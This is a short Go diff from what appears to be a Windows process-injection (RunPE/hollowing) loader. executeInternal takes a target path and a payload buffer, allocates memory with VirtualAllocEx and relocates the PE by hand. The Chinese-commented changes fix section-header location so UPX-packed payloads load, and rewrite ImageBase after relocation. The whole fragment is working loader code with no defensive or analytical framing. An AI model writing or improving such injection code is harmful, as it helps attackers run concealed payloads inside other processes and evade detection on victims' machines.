@@ -120,7 +120,11 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 		return 0, fmt.Errorf("VirtualAllocEx failed")
 	}
 
-	sectionHeaderOffset := uint32(dosHeader.E_lfanew) + uint32(unsafe.Sizeof(*ntHeader))
+	// 🌟 修复一：严谨定位 Section Header，兼容 UPX 等裁剪掉部分数据目录表的程序
+	sectionHeaderOffset := uint32(dosHeader.E_lfanew) + 
+		4 + // PE Signature 大小
+		uint32(unsafe.Sizeof(ntHeader.FileHeader)) + 
+		uint32(ntHeader.FileHeader.SizeOfOptionalHeader)
 	
 	// 手工解析并修复 PE 重定位表 (Base Relocation)，对抗 ASLR (仅在 delta != 0 时执行)
 	rvaToOffset := func(rva uint32) uint32 {
@@ -136,6 +140,9 @@ func executeInternal(targetPath string, payload []byte, wait bool) (uint32, erro
 	delta := uint64(allocAddress) - payloadImageBase
 	
 	if delta != 0 {
+		// 🌟 修复二：同步将新的内存基址写回即将被映射的 PE 头结构中，防止程序内部寻址异常
+		ntHeader.OptionalHeader.ImageBase = uint64(allocAddress)
+
 		relocDir := ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
 		if relocDir.Size > 0 && relocDir.VirtualAddress > 0 {
 			relocRaw := rvaToOffset(relocDir.VirtualAddress)
